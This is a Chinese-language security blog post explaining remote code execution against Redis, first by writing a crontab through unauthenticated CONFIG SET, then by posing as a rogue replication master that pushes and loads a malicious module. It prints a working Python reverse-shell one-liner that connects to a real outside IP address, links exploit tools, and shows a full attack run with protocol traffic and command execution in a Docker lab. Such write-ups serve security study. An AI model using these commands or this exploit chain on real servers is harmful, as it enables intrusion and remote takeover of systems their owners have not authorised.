---
title: Redis 基于主从复制的RCE利用方式
date: 2019-07-10 16:36:11
tags:
- redis
- rce
---

在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大，下面就让我们从以前的redis RCE利用方式出发，一起聊聊关于redis的利用问题。

[https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)


<!--more-->

# 通过写入文件 GetShell

未授权的redis会导致GetShell，可以说已经是众所周知的了。
```
127.0.0.1:6379> config set dir /var/spool/cron/crontabs
OK
127.0.0.1:6379> config set dbfilename root
OK
127.0.0.1:6379> get 1
"\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"115.28.78.16\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
127.0.0.1:6379> save
OK
```

而这种方式是通过写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，形似
```
[padding]
* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"115.28.78.16\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
[padding]
```

这种主要利用了crontab、ssh key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了。

但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。

# 通过主从复制 GetShell

在介绍这种利用方式之前，首先我们需要介绍一下什么是主从复制和redis的模块。

## Redis主从复制

Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。

这里我们开两台docker来做测试
```
ubuntu@VM-1-7-ubuntu:~/lorexxar$ sudo docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
3fdb2479af9c        redis:5.0           "docker-entrypoint.s…"   22 hours ago        Up 4 seconds        0.0.0.0:6380->6379/tcp   epic_khorana
3e313c7498c2        redis:5.0           "docker-entrypoint.s…"   23 hours ago        Up 23 hours         0.0.0.0:6379->6379/tcp   vibrant_hodgkin
```

然后通过slaveof可以设置主从状态

![image.png-62.6kB][1]

这样一来数据就会自动同步了

## Redis模块

在了解了主从同步之后，我们还需要对redis的模块有所了解。

在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。

编写恶意so文件的代码
[https://github.com/RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand)


## 利用原理

Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。

[https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

![image.png-1550kB][2]

在ppt中提到，在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。

然后在从机上加载so文件，我们就可以执行拓展的新命令了。

## 复现过程

这里我们选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。

[https://github.com/LoRexxar/redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)

然后启用redis 5.0的docker

```
ubuntu@VM-1-7-ubuntu:~/lorexxar/redis-rogue-server$ sudo docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
3e313c7498c2        redis:5.0           "docker-entrypoint.s…"   25 hours ago        Up 25 hours         0.0.0.0:6379->6379/tcp   vibrant_hodgkin
```

为了能够更清晰的看到效果，这里我们把从服务端执行完成后删除的部分暂时注释掉。

然后直接通过脚本来攻击服务端
```
ubuntu@VM-1-7-ubuntu:~/lorexxar/redis-rogue-server$ python3 redis-rogue-server_5.py --rhost 172.17.0.3 --rport 6379 --lhost 172.17.0.1 --lport 6381
TARGET 172.17.0.3:6379
SERVER 172.17.0.1:6381
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$10\r\n172.17.0.1\r\n$4\r\n6381\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[->] b'*1\r\n$4\r\nPING\r\n'
[<-] b'+PONG\r\n'
[->] b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<-] b'+OK\r\n'
[->] b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<-] b'+OK\r\n'
[->] b'*3\r\n$5\r\nPSYNC\r\n$40\r\n17772cb6827fd13b0cbcbb0332a2310f6e23207d\r\n$1\r\n1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$42688\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xea\x9f\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b'+OK\r\n'
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
```

然后我们链接上去就可以执行命令
```
ubuntu@VM-1-7-ubuntu:~/lorexxar/redis-rogue-server$ redis-cli -h 172.17.0.3
172.17.0.3:6379> system.exec "id"
"\x89uid=999(redis) gid=999(redis) groups=999(redis)\n"
172.17.0.3:6379> system.exec "whoami"
"\bredis\n"
```





  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ez0kvxi6tsjj6yafo2jflf69/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/1acc0xkhkaq31lgduuzpau23/image.png
